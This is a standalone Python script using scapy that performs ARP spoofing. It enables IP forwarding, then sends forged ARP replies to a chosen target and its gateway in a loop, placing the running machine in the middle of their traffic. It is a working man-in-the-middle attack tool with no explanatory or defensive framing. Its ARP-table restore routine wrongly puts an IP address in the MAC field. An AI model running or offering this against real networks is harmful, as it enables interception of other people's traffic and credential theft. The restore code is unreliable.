#!/usr/bin/env python

from scapy.all import srp, send, Ether, ARP
from time import sleep
from pathlib import Path
import argparse
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", action="store", type=str, help="Please specify target IP address")
    parser.add_argument("gateway", action="store", type=str, help="Please specify default gateway IP address")
    parser.add_argument("--verbose", action="store_true", default=True)
    return parser.parse_args()

def enable_ip_forward():
    path = Path("/proc/sys/net/ipv4/ip_forward")
    print("[+] Enabling IP forwarding.")
    with open(path, "r+") as file:
        if "1" in file.read():
            print("[!] IP forwarding was already enabled.")
        else:
            file.seek(0)
            file.write("1")
            print("[+] IP forwarding enabled.")

def get_mac(ip):
    broadcast_address = "ff:ff:ff:ff:ff:ff"
    answerred, _ = srp(Ether(dst=broadcast_address)/ARP(pdst=ip), timeout=1, verbose=0)
    if answerred:
        return answerred[0][1].hwsrc


def restore(target_ip, spoof_ip, verbose=True):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip, hwsrc=spoof_ip)
    send(arp_response, count=6, verbose=0)
    if verbose:
        print(f"[+] Sent to {target_ip} : {spoof_ip} is at {spoof_mac}")



def spoof(target_ip, spoof_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=0)
    if verbose:
        # self_mac = ARP().hwsrc
        print(f"[+] Sent to {target_ip} : {spoof_ip} is at {arp_response.hwsrc}")


if __name__ == "__main__":
    arguments = get_arguments()
    
    TARGET_IP = arguments.target
    GATEWAY_IP = arguments.gateway
    verbose = arguments.verbose
    
    try:
        enable_ip_forward()
    except PermissionError:
        print("[-] You requested IP forwarding which requires root privileges. QUITTING!")
        sys.exit()


    try:
        while True:
            spoof(TARGET_IP, GATEWAY_IP, verbose)
            spoof(GATEWAY_IP, TARGET_IP, verbose)
            sleep(1)
    except PermissionError:
        print("[-] You requested ARP creation which requires root privileges. QUITTING!")
    except KeyboardInterrupt:
        print("\n\n[-] Detected CTRL+C ... Resetting ARP tables ... Please Wait.")
        restore(TARGET_IP, GATEWAY_IP)
        restore(GATEWAY_IP, TARGET_IP)
    finally:
        sys.exit()